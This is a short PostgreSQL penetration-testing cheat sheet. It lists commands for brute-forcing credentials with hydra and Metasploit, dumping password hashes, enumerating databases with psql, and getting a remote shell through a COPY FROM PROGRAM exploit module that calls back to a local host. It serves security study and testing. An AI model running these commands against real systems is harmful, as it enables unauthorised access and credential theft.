---
title: PostgreSQL Pentesting
description: PostgreSQL a relational database management system. Default port is 5432.
tags:
    - Database
refs:
date: 2023-01-06
draft: false
---

## Enumeration

```sh
nmap --script pgsql-brute -p 5432 <target-ip>
```

### Brute Force Credentials

```sh
hydra -l username -P passwords.txt <target-ip> postgres
hydra -L usernames.txt -p password <target-ip> postgres

# Metasploit
msfconsole
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts <target-ip>
msf> run
```

### Dump User Hashes

```sh
msfconsole
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> set rhosts <target-ip>
msf> set username <username>
msf> set password <password>
msf> run
```

<br />

## Connect

### Remote

```sh
# -W: Force password prompt
psql -h <target-ip> -p <target-port> -d <database> -U <username> -W
# -w: No password
psql -h <target-ip> -p <target-port> -d <database> -U <username> -w
```

<br />

## Commands in psql

```sh
# Prints help
\?
# Prints PostgreSQL version
select version();
# Displays command history
\s
# Lists databases
\l
# Switches to the given database
\c <database_name>
# Lists tables
\dt
# Descibes a table
\d <table_name>
# Lists all users
\du
# Exits psql shell
\q
```

<br />

## Get a Shell and Command Execution

```sh
msfconsole
msf> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf> set rhosts <target-ip>
msf> set lhost <local-ip>
msf> set tablename <table_name>
msf> set username <username>
msf> set password <password>
msf> run
shell
```